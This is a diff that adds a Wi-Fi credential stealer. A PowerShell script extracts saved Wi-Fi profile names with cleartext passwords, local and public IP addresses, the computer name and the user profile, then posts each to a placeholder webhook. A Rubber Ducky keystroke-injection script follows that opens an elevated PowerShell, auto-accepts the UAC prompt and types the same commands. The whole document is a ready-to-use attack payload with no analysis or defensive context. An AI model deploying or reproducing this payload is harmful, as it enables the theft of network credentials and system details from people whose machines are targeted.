@@ -1,0 +1,75 @@
+$Wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize | Out-String
+$dhcp1 = Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' | Out-String
+$public =Invoke-RestMethod http://ipinfo.io/json | Select -exp ip | Out-String
+$webhookUri = 'Webhook here'
+$Body1 = @{ 'username' = $env:USERPROFILE ; 'content' = $public}
+$Body2 = @{ 'username' = $env:USERPROFILE ; 'content' = $dhcp1}
+$Body3 = @{ 'username' = $env:USERPROFILE ; 'content' = $env:computername}
+$Body4 = @{ 'username' = $env:USERPROFILE ; 'content' = $env:USERPROFILE}
+$Body5 = @{ 'username' = $env:USERPROFILE ; 'content' = $Wifi}
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body1
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body2
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body3
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body4
+Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body5 ;exit
+
+
+
+
+
+-------------------------------------------------------------------------------------------
+
+
+DELAY 1500
+GUI r
+DELAY 1500
+STRING Powershell
+DELAY 800
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 800
+STRING $Wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize | Out-String
+ENTER
+DELAY 1000
+STRING $dhcp1 = Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' | Out-String
+ENTER
+DELAY 1000
+STRING $public =Invoke-RestMethod http://ipinfo.io/json | Select -exp ip | Out-String
+ENTER
+DELAY 1000
+STRING $webhookUri = 'webhook here'
+ENTER
+DELAY 1000
+STRING $Body1 = @{ 'username' = $env:USERPROFILE ; 'content' = $public}
+ENTER
+DELAY 1000
+STRING $Body2 = @{ 'username' = $env:USERPROFILE ; 'content' = $dhcp1}
+ENTER
+DELAY 1000
+STRING $Body3 = @{ 'username' = $env:USERPROFILE ; 'content' = $env:computername}
+ENTER
+DELAY 1000
+STRING $Body4 = @{ 'username' = $env:USERPROFILE ; 'content' = $env:USERPROFILE}
+ENTER
+DELAY 1000
+STRING $Body5 = @{ 'username' = $env:USERPROFILE ; 'content' = $Wifi}
+ENTER
+DELAY 1000
+STRING Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body1
+ENTER
+DELAY 1000
+STRING Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body2
+ENTER
+DELAY 1000
+STRING Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body3
+ENTER
+DELAY 1000
+STRING Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body4
+ENTER
+DELAY 1000
+STRING Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body5 ;exit
+ENTER
+
+
+
